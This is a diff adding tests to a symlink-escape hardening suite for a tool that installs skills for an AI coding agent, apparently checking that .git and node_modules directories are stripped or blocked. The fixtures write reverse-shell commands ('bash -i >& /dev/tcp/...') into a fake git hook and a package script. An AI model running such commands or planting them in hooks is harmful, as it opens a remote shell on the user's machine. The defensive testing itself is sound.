@@ -46,6 +46,60 @@ describe('A4 symlink escape hardening', () => {
     await expect(lstat(join(installed, 'outside-link'))).rejects.toThrow();
   });
 
+  it('symlink install fails closed because nested links would remain reachable', async () => {
+    const skill = await writeSkill(source, 'linked-skill');
+    await symlink(outside, join(skill, 'outside-link'), 'dir');
+
+    const result = await installFromSource(source, {
+      home,
+      agent: 'claude-code',
+      mode: 'symlink',
+    });
+
+    expect(result.installed).toEqual([]);
+    expect(result.blocked.map((entry) => entry.name)).toContain('linked-skill');
+    await expect(lstat(join(home, '.claude', 'skills', 'linked-skill'))).rejects.toThrow();
+  });
+
+  it('copy strips excluded metadata/dependency directories while symlink mode blocks them', async () => {
+    const skill = await writeSkill(source, 'excluded-directories');
+    await mkdir(join(skill, '.git', 'hooks'), { recursive: true });
+    await mkdir(join(skill, 'node_modules', 'payload'), { recursive: true });
+    await writeFile(
+      join(skill, '.git', 'hooks', 'post-checkout'),
+      'bash -i >& /dev/tcp/10.0.0.2/1 0>&1\n',
+    );
+    await writeFile(
+      join(skill, 'node_modules', 'payload', 'run.sh'),
+      'bash -i >& /dev/tcp/10.0.0.3/1 0>&1\n',
+    );
+
+    const copyResult = await installFromSource(source, {
+      home,
+      agent: 'claude-code',
+      mode: 'copy',
+      skill: 'excluded-directories',
+    });
+    expect(copyResult.blocked).toEqual([]);
+    const installed = join(home, '.claude', 'skills', 'excluded-directories');
+    await expect(lstat(join(installed, '.git'))).rejects.toThrow();
+    await expect(lstat(join(installed, 'node_modules'))).rejects.toThrow();
+
+    const symlinkHome = mkdtempSync(join(tmpdir(), 'skill-switch-symlink-excluded-home-'));
+    try {
+      const symlinkResult = await installFromSource(source, {
+        home: symlinkHome,
+        agent: 'claude-code',
+        mode: 'symlink',
+        skill: 'excluded-directories',
+      });
+      expect(symlinkResult.installed).toEqual([]);
+      expect(symlinkResult.blocked.map((entry) => entry.name)).toContain('excluded-directories');
+    } finally {
+      await rm(symlinkHome, { recursive: true, force: true });
+    }
+  });
+
   it('sync copy skips symlinks from declared sources', async () => {
     const skill = await writeSkill(source, 'sync-skill');
     await symlink(outside, join(skill, 'outside-link'), 'dir');
